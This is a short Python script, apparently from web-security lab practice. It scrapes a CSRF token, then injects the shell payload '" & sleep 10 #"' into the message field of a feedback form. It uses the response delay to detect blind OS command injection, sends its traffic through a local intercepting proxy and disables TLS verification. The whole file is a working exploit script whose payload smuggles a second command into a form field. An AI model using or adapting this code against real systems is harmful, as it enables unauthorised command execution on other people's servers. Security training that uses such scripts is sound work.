import urllib3
import bs4
import sys
import requests

# to disable unwanted warnings about certificates, .. etc.
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# configure the proxy settings.
proxies = {'http':'http://127.0.0.1:8080', 'https':'http://127.0.0.1:8080'}

# Creating the OS Command injection function.
def run(url):
    # Creating a session for the CSRF token
    session = requests.session()
    csrf = get_csrf(url, session)
    path = 'feedback/submit'
    payload = '" & sleep 10 #"'
    data = { "csrf":csrf, 'name':'A', 'email':'AAA@gmail.com', 'subject':'A', 'message':"A" + payload}

    respond = session.post(url + path, data=data, verify=False, proxies=proxies)
    
    # Checks the total time took to respond
    if respond.elapsed.total_seconds() >= 10:
        print("(+) The Feedback submission is vulnerable to OS command injection.")
    else:
        print("(-) The Feedback submission is NOT vulnerable to OS command injection.")

# Create a function that pull out the CSRF token:
def get_csrf(url, session):
    path = "feedback"
    respond = session.get(url + path, verify=False, proxies=proxies)

    # We use BeautifulSoup to parse the HTML page.
    soup = bs4.BeautifulSoup(respond.text, "html.parser")
    csrf = soup.find("input")["value"]

    return csrf

# Defining the main function
def main():

    # Checks if the script run on the command-line correctly.
    if len(sys.argv) != 2:
        print("(+) Usage: %s <url>" % sys.argv[0])
        print("(+) Example: %s www.example.com" % sys.argv[0])
        sys.exit(-1)
    
    # if the input is valid:
    url = sys.argv[1]
    print("(+) Checking if the Feedback submission is vulnerable... ")
    run(url)

if __name__ == "__main__":
    main()
